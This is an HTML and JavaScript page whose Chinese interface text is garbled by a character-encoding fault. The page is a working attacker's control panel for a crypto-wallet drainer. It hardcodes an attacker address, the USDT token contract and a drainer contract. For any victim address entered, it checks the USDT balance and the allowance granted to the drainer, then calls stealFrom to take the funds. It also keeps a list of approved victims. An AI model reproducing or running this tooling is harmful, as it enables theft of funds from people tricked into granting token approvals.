<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>ç›œå–æ§åˆ¶å° v3.1</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
</head>
<body style="font-family:monospace;padding:30px;">
  <h2>ğŸ› ï¸ æ”»æ“Šè€…æ“ä½œä»‹é¢ <span style="float:right;color:gray;">v3.1</span></h2>
  <div>åˆç´„åœ°å€ï¼š<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></div>
  <div id="status">â³ è®€å–ä¸­...</div><br>
  <input id="victim" placeholder="å—å®³è€…åœ°å€" style="width:380px;">
  <button onclick="steal()">åŸ·è¡Œç›œå–</button>
  <pre id="log">âš™ï¸ ç­‰å¾…æ“ä½œâ€¦</pre>
  <h3>ğŸ“Œ æœ€è¿‘æˆæ¬Šåœ°å€åˆ—è¡¨ï¼š</h3>
  <ul id="list"></ul>
  <script>
    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const contractAddr = "0xFbe9c4748A267562f723C67db673943F901533D6";
    const abi = [{"name":"stealFrom","type":"function","inputs":[{"name":"victim","type":"address"}],"outputs":[],"stateMutability":"nonpayable"}];
    const usdtABI = [{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
                     {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];

    let current;

    async function load() {
      if (!window.ethereum) return alert("è«‹å…ˆå®‰è£ MetaMask");
      const web3 = new Web3(window.ethereum);
      await ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      current = accounts[0];
      const status = document.getElementById("status");
      if (current.toLowerCase() === attacker.toLowerCase()) {
        status.innerHTML = `ğŸ‘¤ ç›®å‰ç™»å…¥å¸³è™Ÿï¼š<b style='color:green;'>0xDa4FfA490992769B8F54063bf0B9E7a4D3479459</b><br>âœ… èº«ä»½é©—è­‰ï¼šä½ æ˜¯æ”»æ“Šè€…æœ¬äºº`;
      } else {
        status.innerHTML = `ğŸ‘¤ ç›®å‰ç™»å…¥å¸³è™Ÿï¼š<b style='color:red;'>${current}</b><br>âŒ éæ”»æ“Šè€…å¸³è™Ÿï¼Œè«‹åˆ‡æ›`;
      }
      renderList();
    }

    function renderList() {
      const ul = document.getElementById("list");
      const data = JSON.parse(localStorage.getItem("victims") || "[]");
      ul.innerHTML = "";
      data.forEach((v, i) => {
        const li = document.createElement("li");
        li.textContent = `${i + 1}. ${v.address} ğŸ•’ ${v.time}`;
        ul.appendChild(li);
      });
    }

    async function steal() {
      const web3 = new Web3(window.ethereum);
      const victim = document.getElementById("victim").value;
      const log = document.getElementById("log");
      if (!victim) return log.innerText = "âŒ è«‹è¼¸å…¥å—å®³è€…åœ°å€";
      const usdt = new web3.eth.Contract(usdtABI, token);
      const balance = await usdt.methods.balanceOf(victim).call();
      const allowance = await usdt.methods.allowance(victim, contractAddr).call();
      const min = Math.min(balance, allowance);
      log.innerText = `ğŸ§¾ å—å®³è€…ï¼š${victim}\nğŸ’° Balanceï¼š${balance}\nğŸ” Allowanceï¼š${allowance}`;
      if (String(min) === "0") return log.innerText += "\nâŒ é¤˜é¡æˆ–æˆæ¬Šé¡åº¦ç‚º 0";
      const contract = new web3.eth.Contract(abi, contractAddr);
      log.innerText += `\nğŸš€ å‘¼å« stealFrom(${victim})...`;
      try {
        const tx = await contract.methods.stealFrom(victim).send({from: current});
        log.innerText += `\nâœ… æˆåŠŸï¼TX Hash: https://etherscan.io/tx/${tx.transactionHash}`;
      } catch (e) {
        log.innerText += `\nâŒ MetaMask æ‹’çµ•æˆ–éŒ¯èª¤ï¼š` + (e.message || e);
      }
    }

    window.onload = load;
  </script>
</body>
</html>